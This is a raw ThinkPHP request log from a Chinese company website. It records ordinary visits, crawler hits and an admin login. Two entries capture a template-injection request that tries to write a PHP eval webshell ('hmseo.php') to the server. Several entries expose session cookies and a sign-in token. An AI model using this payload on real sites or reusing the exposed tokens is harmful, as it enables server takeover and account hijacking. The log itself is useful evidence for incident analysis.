---------------------------------------------------------------
[ 2019-11-03T00:09:01+08:00 ] 172.21.0.9 58.248.108.209 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.031650s][吞吐率：31.60req/s] [内存消耗：3,473.43kb] [文件加载：71]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => '',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001206s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ log ] Cron:clearlog Runat 2019-11-03 00:09:01 Use 0.000099 s

[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.001352s ]
---------------------------------------------------------------
[ 2019-11-03T03:40:59+08:00 ] 172.21.0.9 47.98.97.81 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.042973s][吞吐率：23.27req/s] [内存消耗：3,484.80kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X)',
  'host' => 'www.ldkjmy.com',
  'connection' => 'Keep-Alive',
  'accept-encoding' => 'gzip',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001179s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000476s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T04:44:01+08:00 ] 172.21.0.9 47.108.69.152 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.048198s][吞吐率：20.75req/s] [内存消耗：3,486.07kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',
  'referer' => 'http://www.ldkjmy.com',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn,zh,en',
  'host' => 'www.ldkjmy.com',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001436s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000733s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T04:49:22+08:00 ] 172.21.0.9 106.13.98.183 GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php>
[ info ] www.ldkjmy.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php> [运行时间：0.037002s][吞吐率：27.03req/s] [内存消耗：3,487.49kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://www.ldkjmy.com/?a=fetch&templateFile=public/index&prefix=\'\'&content=<php>file_put_contents(\'hmseo.php\',\'<?php @eval($_POST[hm]);?>hmseo\')</php>',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => 'www.ldkjmy.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'a' => 'fetch',
  'templateFile' => 'public/index',
  'prefix' => '\'\'',
  'content' => '<php>file_put_contents(\'hmseo.php\',\'<?php @eval($_POST[hm]);?>hmseo\')</php>',
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001309s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000533s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T05:05:16+08:00 ] 172.21.0.9 40.77.167.96 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.034542s][吞吐率：28.95req/s] [内存消耗：3,485.59kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'pragma' => 'no-cache',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'www.ldkjmy.com',
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001349s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000507s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T11:34:47+08:00 ] 172.21.0.9 220.181.108.141 GET /casede.html?id=19
[ info ] www.ldkjmy.com/casede.html?id=19 [运行时间：0.037554s][吞吐率：26.63req/s] [内存消耗：2,517.42kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'casede',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,like Gecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'accept-language' => 'zh-cn,zh-tw',
  'if-none-match' => '"@NULL@"',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '19',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T12:46:49+08:00 ] 172.21.0.9 39.100.6.161 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.040137s][吞吐率：24.91req/s] [内存消耗：3,486.07kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',
  'referer' => 'http://www.ldkjmy.com',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn,zh,en',
  'host' => 'www.ldkjmy.com',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.002620s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000504s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T20:54:52+08:00 ] 172.21.0.9 106.13.98.183 GET /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php>
[ info ] www.ldkjmy.com/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php%20@eval($_POST[hm]);?>hmseo')</php> [运行时间：0.048256s][吞吐率：20.72req/s] [内存消耗：3,487.49kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://www.ldkjmy.com/?a=fetch&templateFile=public/index&prefix=\'\'&content=<php>file_put_contents(\'hmseo.php\',\'<?php @eval($_POST[hm]);?>hmseo\')</php>',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => 'www.ldkjmy.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'a' => 'fetch',
  'templateFile' => 'public/index',
  'prefix' => '\'\'',
  'content' => '<php>file_put_contents(\'hmseo.php\',\'<?php @eval($_POST[hm]);?>hmseo\')</php>',
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001418s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000518s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:08:35+08:00 ] 172.21.0.9 52.81.63.62 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.035391s][吞吐率：28.26req/s] [内存消耗：3,486.73kb] [文件加载：73]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'https://www.baidu.com/link?url=MRfBbiYoMN2dUkjoRbN2rTBffYEchy-ODOqiHQybcCyd9lEM1rBtcW2qeEFO_hapAPNeOzTXn1_viVtZ-Fo3wq&wd=&eqid=b684fb560002164c000000025ba325b9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,ja;q=0.5',
  'host' => 'www.ldkjmy.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001319s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000531s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:16:37+08:00 ] 172.21.0.9 171.117.143.245 GET /
[ info ] www.ldkjmy.com/ [运行时间：0.053999s][吞吐率：18.52req/s] [内存消耗：4,414.09kb] [文件加载：78]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'home',
    1 => 'Index',
    2 => 'index',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; signin_token=70f5bbaa30f4daa47be437b04a1702c065b5b28a; yf_logged_user=G%3DeqQSayX%3D1966FJn',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/lang/zh-cn.php
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001874s ]
[ info ] [ RUN ] app\home\controller\Index->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/home/controller/Index.php ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000575s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000273s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_member_list` [ RunTime:0.000917s ]
[ sql ] [ SQL ] SELECT * FROM `yf_member_list` WHERE  `member_list_id` = 1 LIMIT 1 [ RunTime:0.000264s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:41+08:00 ] 172.21.0.9 171.117.143.245 GET /admin
[ info ] www.ldkjmy.com/admin [运行时间：0.042314s][吞吐率：23.63req/s] [内存消耗：4,419.17kb] [文件加载：74]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; signin_token=70f5bbaa30f4daa47be437b04a1702c065b5b28a; yf_logged_user=G%3DeqQSayX%3D1966FJn; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000714s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000213s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_admin` [ RunTime:0.000754s ]
[ sql ] [ SQL ] SELECT * FROM `yf_admin` WHERE  `admin_id` = 1 LIMIT 1 [ RunTime:0.000294s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:41+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/login/login.html
[ info ] www.ldkjmy.com/admin/login/login.html [运行时间：0.048634s][吞吐率：20.56req/s] [内存消耗：4,456.70kb] [文件加载：77]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; signin_token=70f5bbaa30f4daa47be437b04a1702c065b5b28a; yf_logged_user=G%3DeqQSayX%3D1966FJn; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001179s ]
[ info ] [ RUN ] app\admin\controller\Login->login[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ VIEW ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/view/login/login.html [ array (
  0 => 'lang',
) ]
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000509s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000247s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_admin` [ RunTime:0.000695s ]
[ sql ] [ SQL ] SELECT * FROM `yf_admin` WHERE  `admin_id` = 1 LIMIT 1 [ RunTime:0.000218s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:42+08:00 ] 172.21.0.9 171.117.143.245 GET /admin/login/verify.html
[ info ] www.ldkjmy.com/admin/login/verify.html [运行时间：0.056384s][吞吐率：17.74req/s] [内存消耗：4,445.34kb] [文件加载：75]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'verify',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
  'referer' => 'http://www.ldkjmy.com/admin/login/login.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; signin_token=70f5bbaa30f4daa47be437b04a1702c065b5b28a; yf_logged_user=G%3DeqQSayX%3D1966FJn; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.001207s ]
[ info ] [ RUN ] app\admin\controller\Login->verify[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000632s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000216s ] mysql:dbname=www_ldkjmy_com;host=localhost;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `yf_admin` [ RunTime:0.000726s ]
[ sql ] [ SQL ] SELECT * FROM `yf_admin` WHERE  `admin_id` = 1 LIMIT 1 [ RunTime:0.000234s ]
---------------------------------------------------------------
[ 2019-11-03T21:16:42+08:00 ] 172.21.0.9 171.117.143.245 GET /geetest.html?t=1572786986388
[ info ] www.ldkjmy.com/geetest.html?t=1572786986388 [运行时间：0.099544s][吞吐率：10.05req/s] [内存消耗：2,531.45kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'method',
  'method' => 
  array (
    0 => '\\think\\geetest\\GeetestController',
    1 => 'index',
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36',
  'referer' => 'http://www.ldkjmy.com/admin/login/login.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'Hm_lvt_416c770ac83a9d996d7b3793f8c4994d=1571321690,1572445665; aid=1; signin_token=70f5bbaa30f4daa47be437b04a1702c065b5b28a; yf_logged_user=G%3DeqQSayX%3D1966FJn; PHPSESSID=c85qs1fha4c3sg571mg8bh0ct7; thinkphp_show_page_trace=0|0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  't' => '1572786986388',
  'id' => NULL,
)
[ info ] [ RUN ] think\geetest\GeetestController->index[ /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/vendor/yfcmf/geetest/src/GeetestController.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run app\admin\behavior\Cron @app_end [ RunTime:0.000584s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-11-03T21:16:50+08:00 ] 172.21.0.9 171.117.143.245 POST /admin/login/runlogin.html
[ info ] www.ldkjmy.com/admin/login/runlogin.html [运行时间：0.048544s][吞吐率：20.60req/s] [内存消耗：4,577.86kb] [文件加载：78]
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /www/wwwroot/www.ldkjmy.com/aaaa/yamaxun/app/lang/zh-cn.php
[ info ] [ CACHE ] INIT File
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'runlogin',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.ldkjmy.com',
